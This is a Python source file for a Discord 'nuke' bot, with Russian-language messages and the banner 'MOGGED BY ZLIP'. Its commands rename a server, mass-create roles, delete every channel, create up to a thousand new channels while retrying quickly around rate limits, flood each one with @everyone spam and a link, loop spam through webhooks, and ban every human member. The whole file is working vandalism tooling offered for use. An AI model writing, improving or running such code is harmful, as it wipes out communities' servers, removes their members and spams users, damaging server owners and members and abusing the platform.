import discord
from discord.ext import commands
import asyncio
import time
import os
import random
import aiohttp

bot = commands.Bot(command_prefix='-', intents=discord.Intents.all(), help_command=None)

channel_counter = 0
start_time = 0
rate_limit_hits = 0
webhook_spam_active = False

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')
    print(f'🌐 Запущен на {len(bot.guilds)} серверах')
    
    await bot.change_presence(
        status=discord.Status.idle,
        activity=discord.Game(name="-dszlip | MOGGED BY ZLIP")
    )

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    await ctx.send(f"❌ Ошибка: {error}")

@bot.command()
async def help(ctx):
    embed = discord.Embed(
        title="🔥 GVK NUKE TOOL 🔥",
        description="Команды для уничтожения",
        color=discord.Color.red()
    )
    embed.add_field(name="-dszlip", value="Запускает нюк сервера", inline=False)
    embed.add_field(name="-status", value="Показывает статус бота", inline=False)
    embed.add_field(name="-webhook", value="Спамит вебхуками", inline=False)
    embed.add_field(name="-ping", value="Проверка задержки", inline=False)
    embed.add_field(name="-servers", value="Список серверов бота", inline=False)
    embed.add_field(name="-massban", value="Бан всех участников", inline=False)
    embed.set_footer(text="MOGGED BY ZLIP")
    await ctx.send(embed=embed)

@bot.command()
async def ping(ctx):
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓 Понг! Задержка: {latency}мс")

@bot.command()
async def servers(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Нет прав")
        return
    
    server_list = ""
    for i, guild in enumerate(bot.guilds):
        server_list += f"{i+1}. {guild.name} (ID: {guild.id}) - {len(guild.members)} участников\n"
    
    if len(server_list) > 1900:
        with open("servers.txt", "w", encoding="utf-8") as f:
            f.write(server_list)
        await ctx.send(file=discord.File("servers.txt"))
        os.remove("servers.txt")
    else:
        await ctx.send(f"📊 Серверы бота:\n```{server_list}```")

@bot.command()
async def webhook(ctx):
    global webhook_spam_active
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Нет прав")
        return
    
    webhook_spam_active = not webhook_spam_active
    
    if webhook_spam_active:
        await ctx.send("🌐 Спам вебхуками АКТИВИРОВАН")
        
        webhook_urls = [
            "https://discord.com/api/webhooks/...",
        ]
        
        spam_text = "@everyone\n**MOGGED BY ZLIP**\nhttps://guns.lol/dszlip"
        
        async def spam_webhooks():
            while webhook_spam_active:
                for url in webhook_urls:
                    try:
                        async with aiohttp.ClientSession() as session:
                            data = {"content": spam_text}
                            await session.post(url, json=data)
                    except:
                        pass
                await asyncio.sleep(0.5)
        
        bot.loop.create_task(spam_webhooks())
    else:
        await ctx.send("🛑 Спам вебхуками ОСТАНОВЛЕН")

@bot.command()
async def dszlip(ctx):
    global channel_counter, start_time, rate_limit_hits
    channel_counter = 0
    start_time = time.time()
    rate_limit_hits = 0
    
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Нужны права администратора!")
        return
    
    confirm_msg = await ctx.send("⚠️ **ПОДТВЕРДИ НЮК**\nНапиши `ДА` в течение 10 секунд")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.upper() == "ДА"
    
    try:
        await bot.wait_for('message', timeout=10.0, check=check)
    except asyncio.TimeoutError:
        await ctx.send("❌ Нюк отменен")
        return
    
    await ctx.send("🔥 **НЮК ЗАПУЩЕН**")
    
    guild = ctx.guild
    
    async def create_roles():
        for i in range(50):
            try:
                await guild.create_role(name=f"ZLIP-{i+1}")
            except:
                break
            await asyncio.sleep(0.01)
    
    await guild.edit(name="MOGGED BY ZLIP")
    await create_roles()
    print("✅ Название и роли изменены")
    
    print("🗑️ УДАЛЕНИЕ КАНАЛОВ...")
    
    deleted = 0
    skipped = 0
    channels = list(guild.channels)
    total = len(channels)
    
    async def delete_single_channel(channel):
        try:
            await channel.delete()
            return True
        except:
            return False
    
    batch_size = 200
    for i in range(0, total, batch_size):
        batch = channels[i:i+batch_size]
        tasks = [delete_single_channel(ch) for ch in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                deleted += 1
            else:
                skipped += 1
        
        if (i + batch_size) % 400 == 0:
            print(f"   📦 Удалено {min(i+batch_size, total)}/{total} каналов")
    
    print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
    
    print("🔥 МАКСИМАЛЬНО ЖЕСТКОЕ СОЗДАНИЕ КАНАЛОВ...")
    
    SPAM_TEXT = """@everyone
**MOGGED BY ZLIP**

https://guns.lol/dszlip

ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ZLIP
"""
    
    created = 0
    failed = 0
    target_channels = 1000
    
    async def create_single_channel(i):
        global channel_counter, rate_limit_hits
        
        try:
            ch = await guild.create_text_channel(f"zlip-nuked-{i+1}")
            
            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
            await asyncio.gather(*messages)
            
            channel_counter += 1
            
            if channel_counter % 10 == 0:
                elapsed = time.time() - start_time
                speed = channel_counter / elapsed if elapsed > 0 else 0
                print(f"📊 [{channel_counter}] {speed:.1f}/сек")
            
            return True
            
        except discord.Forbidden:
            return False
        except discord.HTTPException as e:
            if "rate" in str(e).lower():
                rate_limit_hits += 1
                wait_time = min(rate_limit_hits * 0.001, 0.005)
                await asyncio.sleep(wait_time)
                return await create_single_channel(i)
            else:
                return False
        except Exception as e:
            return False
    
    batch_size = 100
    max_batches = target_channels // batch_size + 1
    
    for batch_num in range(max_batches):
        tasks = []
        for j in range(batch_size):
            i = batch_num * batch_size + j
            if i >= target_channels:
                break
            tasks.append(create_single_channel(i))
        
        if not tasks:
            break
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                created += 1
            else:
                failed += 1
        
        if created >= target_channels:
            print(f"✅ Достигнута цель: {created} каналов")
            break
        
        if created % 50 == 0 and created > 0:
            elapsed = time.time() - start_time
            speed = created / elapsed if elapsed > 0 else 0
            print(f"📊 ПРОГРЕСС: {created}/{target_channels} ({speed:.1f}/сек)")
    
    print("\n" + "="*50)
    print("💀 НЬЮК ЗАВЕРШЁН 💀")
    print(f"✅ Создано каналов: {created}")
    print(f"✅ Сообщений отправлено: {created * 5}")
    print(f"❌ Ошибок: {failed}")
    print(f"⏱️ Время: {time.time() - start_time:.1f} сек")
    print(f"📊 Скорость: {created / (time.time() - start_time):.1f} каналов/сек")
    print("="*50)
    
    try:
        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nСообщений: {created * 5}\nСкорость: {created / (time.time() - start_time):.1f}/сек")
    except:
        pass

@bot.command()
async def status(ctx):
    embed = discord.Embed(
        title="🔥 СТАТУС БОТА 🔥",
        color=discord.Color.red()
    )
    embed.add_field(name="Бот", value=bot.user.name, inline=True)
    embed.add_field(name="Серверов", value=len(bot.guilds), inline=True)
    embed.add_field(name="Пинг", value=f"{round(bot.latency * 1000)}мс", inline=True)
    embed.add_field(name="Команда", value="-dszlip", inline=True)
    embed.set_footer(text="MOGGED BY ZLIP")
    await ctx.send(embed=embed)

@bot.command()
async def massban(ctx):
    if not ctx.author.guild_permissions.administrator:
        await ctx.send("❌ Нет прав")
        return
    
    await ctx.send("⚠️ БАН ВСЕХ УЧАСТНИКОВ...")
    
    banned = 0
    for member in ctx.guild.members:
        if not member.bot:
            try:
                await member.ban(reason="MOGGED BY ZLIP")
                banned += 1
            except:
                pass
            await asyncio.sleep(0.01)
    
    await ctx.send(f"✅ Забанено: {banned} участников")

import os
bot.run(os.environ['TOKEN'])
